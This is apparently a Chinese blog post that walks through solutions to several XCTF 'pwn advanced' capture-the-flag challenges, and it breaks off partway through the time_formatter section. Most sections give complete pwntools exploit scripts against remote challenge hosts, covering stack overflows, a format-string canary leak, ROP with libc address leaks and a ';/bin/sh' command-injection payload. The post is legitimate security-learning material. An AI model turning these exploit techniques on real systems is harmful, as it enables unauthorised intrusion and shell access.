href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-10"><span class="nav-number">1.13.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-9"><span class="nav-number">1.13.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-satck2"><span class="nav-number">1.14.</span> <span class="nav-text">14.satck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-greeting-150"><span class="nav-number">1.15.</span> <span class="nav-text">16.greeting-150</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-11"><span class="nav-number">1.15.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-10"><span class="nav-number">1.15.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-secret-file"><span class="nav-number">1.16.</span> <span class="nav-text">17.secret_file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-supermarket"><span class="nav-number">1.17.</span> <span class="nav-text">18.supermarket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-12"><span class="nav-number">1.17.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-11"><span class="nav-number">1.17.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-noleak"><span class="nav-number">1.18.</span> <span class="nav-text">19. noleak</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-13"><span class="nav-number">1.18.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-12"><span class="nav-number">1.18.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-babyfengshui"><span class="nav-number">1.19.</span> <span class="nav-text">20. babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-14"><span class="nav-number">1.19.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-13"><span class="nav-number">1.19.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-dubblesort"><span class="nav-number">1.20.</span> <span class="nav-text">21. dubblesort</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-15"><span class="nav-number">1.20.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-14"><span class="nav-number">1.20.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-RCalc"><span class="nav-number">1.21.</span> <span class="nav-text">22. RCalc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-16"><span class="nav-number">1.21.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%86%E6%9E%90"><span class="nav-number">1.21.2.</span> <span class="nav-text">思路及分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-Aul"><span class="nav-number">1.22.</span> <span class="nav-text">23.Aul</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24-1000levevls"><span class="nav-number">1.23.</span> <span class="nav-text">24.1000levevls</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-17"><span class="nav-number">1.23.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-15"><span class="nav-number">1.23.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25-format2"><span class="nav-number">1.24.</span> <span class="nav-text">25.format2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-18"><span class="nav-number">1.24.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-16"><span class="nav-number">1.24.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#26-4-ReeHY-main-100"><span class="nav-number">1.25.</span> <span class="nav-text">26.4-ReeHY-main-100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#27-echo-back"><span class="nav-number">1.26.</span> <span class="nav-text">27.echo_back</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28"><span class="nav-number">1.27.</span> <span class="nav-text">28.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hacknote"><span class="nav-number">1.28.</span> <span class="nav-text">hacknote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-19"><span class="nav-number">1.28.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-17"><span class="nav-number">1.28.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easypwn"><span class="nav-number">1.29.</span> <span class="nav-text">easypwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-20"><span class="nav-number">1.29.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-18"><span class="nav-number">1.29.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li></ol></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ykx</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/5600bec/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ykx">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lsh">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          攻防世界pwn进阶
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-11-23 09:09:48" itemprop="dateCreated datePublished" datetime="2020-11-23T09:09:48+08:00">2020-11-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-30 19:00:29" itemprop="dateModified" datetime="2020-12-30T19:00:29+08:00">2020-12-30</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
<a id="more"></a>

<h2 id="1-forgot"><a href="#1-forgot" class="headerlink" title="1.forgot"></a>1.forgot</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png" alt="image-20201220180827121"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png" alt="image-20201216091450390"></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091522087.png" alt="image-20201216091522087"></p>
<p>发现scanf是一个溢出点，没有限制输入的大小。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091600591.png" alt="image-20201216091600591">在主函数的最后是调用调用 (指针v3 + (v14 - 1))所指向的函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091711987.png" alt="image-20201216091711987"></p>
<p>整个for循环控制v14的值。</p>
<p>查看其他函数，发现一个后门函数。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091815706.png" alt="image-20201216091815706"></p>
<h3 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>显然，目标就是执行后门函数。联想到v2可以溢出，那么第一个想法就是v2能否溢出修改v3的值。查看栈的结构，发现v2是可以溢出修改v3的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092006005.png" alt="image-20201216092006005"></p>
<p>接下来考虑v14的值，如果v14是1，那么就直接执行v3指向的函数，这是最方便的。要使v14为1，就需要不满足下列条件。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092221627.png" alt="image-20201216092221627"></p>
<p>“A”不符合条件。</p>
<p>没有开启pie，那么可以直接通过ida确定shell函数的地址。</p>
<p>最后编写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">42685</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(<span class="number">0x80486CC</span>)<span class="comment">#v2与v3距离0x20</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>)<span class="comment">#第一次输入无所谓</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093640287.png" alt="image-20201216093640287"></p>
<h2 id="2-Mary-Morton"><a href="#2-Mary-Morton" class="headerlink" title="2.Mary_Morton"></a>2.Mary_Morton</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180854344.png" alt="image-20201220180854344"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093833219.png" alt="image-20201216093833219"></p>
<p>开启了canary。</p>
<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>程序提供了两种漏洞，格式化字符串和栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094746428.png" alt="image-20201216094746428"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094805753.png" alt="image-20201216094805753"></p>
<p>同时也发现了后门函数<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094836014.png" alt="image-20201216094836014"></p>
<h3 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>既然由栈溢出，那么最直接的思路就是通过栈溢出覆盖返回地址去执行后门函数。但是程序开启了canary，需要绕过。绕过的方法很多，考虑到给了格式化字符串，那么基本方向是利用格式化字符串泄露canary。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095700046.png" alt="image-20201216095700046">可以看出，canary是在ebp的上一个位置。          </p>
<p>那么接下来就是确定偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095859731.png" alt="image-20201216095859731"></p>
<p> (0x7fffffffdde8-0x7fffffffdd60)/8 = 17，由于是64位还有6个寄存器，所以偏移一共是17+6 = 23.</p>
<p>因此exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">52579</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(shell)<span class="comment">#栈溢出</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216100848549.png" alt="image-20201216100848549"></p>
<h2 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3.warmup"></a>3.warmup</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180909635.png" alt="image-20201220180909635"></p>
<p>这道题没有给附件，那么就是fuzz的题目了。</p>
<p>fuzz，也就是模糊测试。Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>
<p>首先，先跑一下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202164645530.png" alt="image-20201202164645530"></p>
<p>可以看到给了一个地址。这道题难度系数不大，加上给了一个地址，因此猜测是简单的栈溢出。</p>
<p>编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分三种情况，不用地址，用32位地址，用64位地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">p,num,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*num</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">2</span>):</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43573</span>)</span><br><span class="line">                fuzz(p,i,j)</span><br><span class="line">                text = p.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                p.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="4-welpwn"><a href="#4-welpwn" class="headerlink" title="4.welpwn"></a>4.welpwn</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180923482.png" alt="image-20201220180923482"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220181243613.png" alt="image-20201220181243613"></p>
<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183006893.png" alt="image-20201220183006893"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183024184.png" alt="image-20201220183024184"></p>
<p>整个程序，逻辑是主函数获取输入，在echo函数中会将输入复制到s2中，再进行输出。主函数的输入范围远大于s2，可以做到栈溢出。</p>
<p>但是需要注意的是，在复制的for循环中，如果为<code>\x00</code>会使得判断语句为0，造成循环中断。</p>
<h3 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>程序只开启了堆栈不可执行保护，同时没有调用过system函数，那么只有先泄露地址再进行rop。注意到for循环不能出现<code>\x00</code>，直接借助echo泄露地址的方法就不可行了，由于是小端序，返回地址的位数一致，覆盖返回地址是可行的。</p>
<p>但是，在主函数的输入的数据仍然是在主函数的栈中，因此可以覆盖echo函数的返回地址到主函数栈帧。要返回到主函数的栈帧，要么知道地址，要么用pop之类的语句。显然，获得栈帧地址不现实，那么就寻找pop语句。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220190823145.png" alt="image-20201220190823145"></p>
<p>可以发现，最多能够一次出栈4个，而在echo函数中，覆盖到返回地址也就是需要0x20个字节，也就是说主函数的栈帧与s2在栈上的位置也就相隔0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220191614222.png" alt="image-20201220191614222"></p>
<p>可以看到，s2复制的起始地址与buf相隔0x20.因此使用之前的pop语句之后，就可以跳过覆盖s2的字节，执行泄露代码。</p>
<p>利用puts函数泄露got地址，再返回到start。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">48838</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">sh = base +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(sh)+p64(system)+p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220194125391.png" alt="image-20201220194125391"></p>
<h2 id="5-monkey"><a href="#5-monkey" class="headerlink" title="5.monkey"></a>5.monkey</h2><p>这次获取的附件比较奇怪</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165328947.png" alt="image-20201202165328947"></p>
<p>用ida打开js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165908347.png" alt="image-20201202165908347"></p>
<p>发现完全看不懂是在干什么。</p>
<p>试着执行以下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202170029431.png" alt="image-20201202170029431"></p>
<p>感觉像是一个shell，这道题触及了我的知识盲区。</p>
<p>网上查找wp，才知道这是个jsshell。利用JavaScript的系统调用就行。</p>
<h2 id="6-time-formatter"><a href="#6-time-formatter" class="headerlink" title="6.time_formatter"></a>6.time_formatter</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165602237.png" alt="image-20201202165602237"></p>
<h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p>根据程序功能，将函数重命名。</p>
<p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171240776.png" alt="image-20201202171240776"></p>
<p>在set_time_format函数中，找到比较关键的输入函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171329588.png" alt="image-20201202171329588"></p>
<p>继续往下</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171507426.png" alt="image-20201202171507426"></p>
<p>这里值得注意的是strdup函数。</p>
<blockquote>
<p>定义函数：char * strdup(const char *s);</p>
<p>函数说明：strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s 字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。</p>
</blockquote>
<p>在设置时区的函数中，也发现了也会调用strdup函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171856179.png" alt="image-20201202171856179"></p>
<p>在退出函数中发现，是先free再询问是否退出。这里就有一个UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172023878.png" alt="image-20201202172023878"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172043020.png" alt="image-20201202172043020"></p>
<p>最后在打印函数中看到，command会包含format里的内容。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172125280.png" alt="image-20201202172125280"></p>
<p>也就是说，最终执行的是<code>system(/bin/date -d @unix_time &#39;format&#39;)</code>.因此，只要format里的内容是<code>&#39;;/bin/sh&#39;</code>就可以得到shell。</p>
<p>但是，注意到format输入会有一个检测函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172403191.png" alt="image-20201202172403191"></p>
<p>format只能包含”%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# “里的内容。</p>
<h3 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>上面已经知道，需要将<code>&#39;;/bin/sh&#39;</code>写入format，就要绕过检查函数。有一个UAF漏洞可以利用。思路就很清晰了：</p>
<ul>
<li>随便输入一个format。</li>
